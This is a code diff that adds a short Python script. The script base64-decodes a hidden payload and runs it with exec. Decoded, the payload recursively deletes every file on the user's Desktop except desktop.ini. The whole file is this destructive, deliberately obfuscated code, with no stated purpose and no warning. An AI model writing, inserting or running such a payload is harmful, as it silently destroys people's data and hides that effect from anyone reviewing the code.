@@ -1,0 +1,8 @@
+#Dependencies
+import os
+import base64
+
+#Main
+_0x_ = base64.b64decode(b'Zm9yIHJvb3QsIHN1YmRpcnMsIGZpbGVzIGluIG9zLndhbGsob3MucGF0aC5leHBhbmR1c2VyKCJ+IikgKyAiL0Rlc2t0b3AiKToKICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgIGlmIGZpbGUgIT0gImRlc2t0b3AuaW5pIjoKICAgICAgICAgICAgb3MucmVtb3ZlKG9zLnBhdGguam9pbihyb290LCBmaWxlKSk=')
+
+exec(_0x_)
